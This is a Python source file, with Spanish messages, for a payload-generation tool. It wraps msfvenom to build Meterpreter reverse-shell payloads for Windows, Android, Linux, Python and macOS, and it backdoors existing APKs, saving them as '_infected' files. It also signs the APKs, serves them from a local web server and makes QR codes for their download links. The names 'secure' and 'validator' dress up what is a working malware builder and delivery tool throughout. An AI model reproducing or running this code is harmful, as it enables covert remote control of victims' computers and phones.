import socket
import os
import time
import webbrowser
import subprocess
import logging
import shlex
import ipaddress
import re
from threading import Thread
from pathlib import Path
from typing import Optional, Tuple, Dict, Any
from modules.qrgen import generar_qr


class SecurityValidator:
    
    @staticmethod
    def validate_ip(ip_address: str) -> bool:
        try:
            ipaddress.ip_address(ip_address)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def validate_port(port: str) -> bool:
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    @staticmethod
    def validate_filename(filename: str) -> bool:
        pattern = r'^[a-zA-Z0-9_-]+$'
        return bool(re.match(pattern, filename)) and len(filename) <= 50
    
    @staticmethod
    def validate_payload_type(payload: str) -> bool:
        allowed_payloads = [
            'windows/meterpreter/reverse_tcp',
            'windows/x64/meterpreter/reverse_https',
            'android/meterpreter/reverse_tcp',
            'android/meterpreter/reverse_https',
            'linux/x64/meterpreter/reverse_tcp',
            'python/meterpreter/reverse_tcp',
            'osx/x64/shell_reverse_https'
        ]
        return payload in allowed_payloads
    
    @staticmethod
    def sanitize_input(user_input: str) -> str:
        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '"', "'"]
        sanitized = user_input
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        return sanitized.strip()


class SecurePayloadGenerator:
    
    def __init__(self):
        self.validator = SecurityValidator()
        self.setup_logging()
        self.payloads_config = self._load_payload_config()
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('payload_generator.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _load_payload_config(self) -> Dict[str, Any]:
        return {
            "1": {"nombre": "Windows", "opciones": {
                "1": ("Windows 7", "windows/meterpreter/reverse_tcp", ".exe"),
                "3": ("Windows 10", "windows/x64/meterpreter/reverse_https", ".exe"),
                "4": ("Windows 11", "windows/x64/meterpreter/reverse_https", ".exe")
            }},
            "2": {"nombre": "Android", "opciones": {
                "1": ("Android 5", "android/meterpreter/reverse_tcp", ".apk"),
                "2": ("Android 6", "android/meterpreter/reverse_tcp", ".apk"),
                "3": ("Android 7", "android/meterpreter/reverse_tcp", ".apk"),
                "4": ("Android 8", "android/meterpreter/reverse_tcp", ".apk"),
                "5": ("Android 9", "android/meterpreter/reverse_tcp", ".apk"),
                "6": ("Android 10", "android/meterpreter/reverse_tcp", ".apk"),
                "7": ("Android 11", "android/meterpreter/reverse_https", ".apk"),
                "8": ("Android 12", "android/meterpreter/reverse_https", ".apk"),
                "9": ("Android 13", "android/meterpreter/reverse_https", ".apk"),
                "10": ("Android 14", "android/meterpreter/reverse_https", ".apk")
            }},
            "3": {"nombre": "Linux", "opciones": {
                "4": ("Arch Linux", "linux/x64/meterpreter/reverse_tcp", ".elf")
            }},
            "4": {"nombre": "Python", "opciones": {
                "1": ("Python 3.8", "python/meterpreter/reverse_tcp", ".py"),
                "2": ("Python 3.9", "python/meterpreter/reverse_tcp", ".py"),
                "3": ("Python 3.10", "python/meterpreter/reverse_tcp", ".py"),
                "4": ("Python 3.11", "python/meterpreter/reverse_tcp", ".py"),
                "5": ("Python 3.12", "python/meterpreter/reverse_tcp", ".py"),
                "6": ("Python 3.13", "python/meterpreter/reverse_tcp", ".py")
            }},
            "5": {"nombre": "macOS", "opciones": {
                "1": ("Big Sur 11", "osx/x64/shell_reverse_https", ".macho"),
                "2": ("Monterey 12", "osx/x64/shell_reverse_https", ".macho"),
                "3": ("Ventura 13", "osx/x64/shell_reverse_https", ".macho"),
                "4": ("Sonoma 14", "osx/x64/shell_reverse_https", ".macho"),
                "5": ("Sequoia 15", "osx/x64/shell_reverse_https", ".macho")
            }}
        }
    
    def get_secure_lhost(self) -> str:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(5)  
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]

                if self.validator.validate_ip(ip):
                    return ip
                else:
                    self.logger.warning(f"IP obtenida no válida: {ip}")
                    return "127.0.0.1"
        except Exception as e:
            self.logger.error(f"Error obteniendo IP local: {e}")
            return "127.0.0.1"
    
    def secure_input(self, prompt: str, input_type: str = "general") -> Optional[str]:
        max_attempts = 3
        attempts = 0
        
        while attempts < max_attempts:
            try:
                user_input = input(prompt).strip()
                
                if not user_input:
                    print("La entrada no puede estar vacía.")
                    attempts += 1
                    continue
 
                sanitized_input = self.validator.sanitize_input(user_input)

                if input_type == "port" and not self.validator.validate_port(sanitized_input):
                    print("Puerto inválido (1-65535)")
                    attempts += 1
                    continue
                elif input_type == "filename" and not self.validator.validate_filename(sanitized_input):
                    print("Nombre de archivo inválido. Solo alfanuméricos, guiones y guiones bajos.")
                    attempts += 1
                    continue
                elif input_type == "option" and not sanitized_input.isdigit():
                    print("Opción debe ser un número.")
                    attempts += 1
                    continue
                
                return sanitized_input
                
            except KeyboardInterrupt:
                print("\nOperación cancelada por el usuario")
                return None
            except Exception as e:
                self.logger.error(f"Error obteniendo entrada: {e}")
                attempts += 1
                continue
        
        print(f"Máximo número de intentos excedido ({max_attempts})")
        return None
    
    def secure_command_execution(self, command: list, shell: bool = False) -> bool:
        try:
            if not command or not isinstance(command, list):
                self.logger.error("Comando inválido")
                return False

            if shell:
                command = [shlex.quote(arg) for arg in command]
            
            result = subprocess.run(
                command,
                check=True,
                capture_output=True,
                text=True,
                timeout=300,  
                shell=shell
            )
            
            if result.returncode == 0:
                self.logger.info(f"Comando ejecutado exitosamente: {' '.join(command[:2])}")
                return True
            else:
                self.logger.error(f"Comando falló con código {result.returncode}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Comando expiró por timeout")
            return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error ejecutando comando: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Error inesperado ejecutando comando: {e}")
            return False
    
    def create_secure_directory(self, directory: str) -> bool:
        try:
            path = Path(directory)
            path.mkdir(parents=True, exist_ok=True, mode=0o750)
            return True
        except Exception as e:
            self.logger.error(f"Error creando directorio {directory}: {e}")
            return False
    
    def iniciar_php_server_seguro(self):
        try:
            web_dir = Path("web")
            if not web_dir.exists():
                self.logger.error("Directorio web no existe")
                return
            
            os.chdir(web_dir)

            cmd = ["php", "-S", "127.0.0.1:8080"]
            
            with open(os.devnull, 'w') as devnull:
                subprocess.Popen(
                    cmd,
                    stdout=devnull,
                    stderr=devnull,
                    preexec_fn=os.setsid  
                )
            
            self.logger.info("Servidor PHP iniciado en 127.0.0.1:8080")
            
        except Exception as e:
            self.logger.error(f"Error iniciando servidor PHP: {e}")
    
    def generar_payload_seguro(self) -> Optional[Tuple[str, str, str]]:
        try:
            lhost = self.get_secure_lhost()
            print(f"\nIP detectada automáticamente: {lhost}")

            lport = self.secure_input("Puerto LPORT: ", "port")
            if not lport:
                return None

            while True:
                name = self.secure_input("Nombre del payload (sin extensión): ", "filename")
                if name:
                    break
                print("El nombre no puede estar vacío.")

            print("\nElige el sistema operativo objetivo:\n")
            print(" 1) Windows\n 2) Android\n 3) Linux\n 4) Python\n 5) macOS")
            
            sistema = self.secure_input("\n>> Opción: ", "option")
            if not sistema or sistema not in self.payloads_config:
                print("Opción inválida.")
                return None

            print(f"\nElige la versión de {self.payloads_config[sistema]['nombre']}:\n")
            for key, val in self.payloads_config[sistema]["opciones"].items():
                print(f" {key}) {val[0]}")
            
            subop = self.secure_input("\n>> Opción: ", "option")
            if not subop or subop not in self.payloads_config[sistema]["opciones"]:
                print("Opción inválida.")
                return None
            
            version, payload, extension = self.payloads_config[sistema]["opciones"][subop]

            if not self.validator.validate_payload_type(payload):
                self.logger.error(f"Tipo de payload no válido: {payload}")
                return None

            output_dir = "payloads"
            if not self.create_secure_directory(output_dir):
                return None
            
            output = os.path.join(output_dir, f"{name}{extension}")

            if extension == ".apk":
                success = self._generar_apk_seguro(payload, lhost, lport, name, output_dir)
            else:
                success = self._generar_payload_generico(payload, lhost, lport, output, extension)
            
            if success:
                print(f"\nPayload generado exitosamente: {output}")
                

                print("\nIniciando servidor web en http://127.0.0.1:8080...")
                Thread(target=self.iniciar_php_server_seguro, daemon=True).start()
                time.sleep(2)
                
                try:
                    webbrowser.open("http://127.0.0.1:8080")
                except Exception as e:
                    self.logger.warning(f"No se pudo abrir navegador: {e}")

                if extension == ".apk":
                    try:
                        url_payload = f"http://{lhost}:8080/{os.path.basename(output)}"
                        print(f"\nEnlace para descargar APK: {url_payload}")
                        generar_qr(url_payload)
                    except Exception as e:
                        self.logger.error(f"Error generando QR: {e}")
                
                return payload, lhost, lport
            else:
                return None
                
        except Exception as e:
            self.logger.error(f"Error generando payload: {e}")
            return None
    
    def _generar_apk_seguro(self, payload: str, lhost: str, lport: str, name: str, output_dir: str) -> bool:
        try:
            raw_apk = os.path.join(output_dir, f"{name}_unsigned.apk")
            aligned_apk = os.path.join(output_dir, f"{name}.apk")
            
            print(f"\nGenerando payload APK → {payload}")

            msfvenom_cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-o", raw_apk
            ]
            
            if not self.secure_command_execution(msfvenom_cmd):
                return False

            zipalign_cmd = ["zipalign", "-p", "4", raw_apk, aligned_apk]
            if not self.secure_command_execution(zipalign_cmd):
                return False

            keystore_path = "debug.keystore"
            if not os.path.exists(keystore_path):
                print("Creando keystore debug...")
                keytool_cmd = [
                    "keytool", "-genkey", "-v",
                    "-keystore", keystore_path,
                    "-alias", "androiddebugkey",
                    "-storepass", "android",
                    "-keypass", "android",
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-dname", "CN=Android Debug,O=Android,C=US"
                ]
                
                if not self.secure_command_execution(keytool_cmd):
                    self.logger.warning("No se pudo crear keystore, continuando sin firmar")
                    return True

            print("Firmando APK...")
            apksigner_cmd = [
                "apksigner", "sign",
                "--ks", keystore_path,
                "--ks-key-alias", "androiddebugkey",
                "--ks-pass", "pass:android",
                "--key-pass", "pass:android",
                "--v2-signing-enabled", "true",
                aligned_apk
            ]
            
            if not self.secure_command_execution(apksigner_cmd):
                self.logger.warning("No se pudo firmar APK, continuando sin firma")

            try:
                if os.path.exists(raw_apk):
                    os.remove(raw_apk)
            except Exception as e:
                self.logger.warning(f"No se pudo eliminar archivo temporal: {e}")
            
            print(f"\nAPK generado: {aligned_apk}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error generando APK: {e}")
            return False
    
    def _generar_payload_generico(self, payload: str, lhost: str, lport: str, output: str, extension: str) -> bool:
        try:
            fmt_map = {
                ".exe": "exe",
                ".elf": "elf",
                ".macho": "macho",
                ".py": "raw"
            }
            
            fmt = fmt_map.get(extension, "raw")
            
            print(f"\nGenerando payload → {payload}")
            
            msfvenom_cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", fmt,
                "-o", output
            ]
            
            return self.secure_command_execution(msfvenom_cmd)
            
        except Exception as e:
            self.logger.error(f"Error generando payload genérico: {e}")
            return False
    
    def generar_payload_con_base_apk_seguro(self, apk_base_path: str, ip: str, puerto: str) -> Optional[str]:
        try:
            if not self.validator.validate_ip(ip):
                self.logger.error(f"IP inválida: {ip}")
                return None
            
            if not self.validator.validate_port(puerto):
                self.logger.error(f"Puerto inválido: {puerto}")
                return None

            if not os.path.exists(apk_base_path):
                self.logger.error(f"APK base no encontrado: {apk_base_path}")
                return None

            output_path = "output"
            if not self.create_secure_directory(output_path):
                return None

            base_name = os.path.basename(apk_base_path)
            safe_name = self.validator.sanitize_input(base_name.replace(".apk", "_infected.apk"))
            ruta_apk_salida = os.path.join(output_path, safe_name)
            
            comando = [
                "msfvenom",
                "-x", apk_base_path,
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={ip}",
                f"LPORT={puerto}",
                "-o", ruta_apk_salida
            ]
            
            if self.secure_command_execution(comando):
                self.logger.info(f"APK infectado generado: {ruta_apk_salida}")
                return ruta_apk_salida
            else:
                return None
                
        except Exception as e:
            self.logger.error(f"Error generando payload con APK base: {e}")
            return None


def get_lhost():
    generator = SecurePayloadGenerator()
    return generator.get_secure_lhost()


def iniciar_php_server():
    generator = SecurePayloadGenerator()
    generator.iniciar_php_server_seguro()


def generar_payload():
    generator = SecurePayloadGenerator()
    return generator.generar_payload_seguro()


def generar_payload_con_base_apk(apk_base_path, ip, puerto):
    generator = SecurePayloadGenerator()
    return generator.generar_payload_con_base_apk_seguro(apk_base_path, ip, puerto)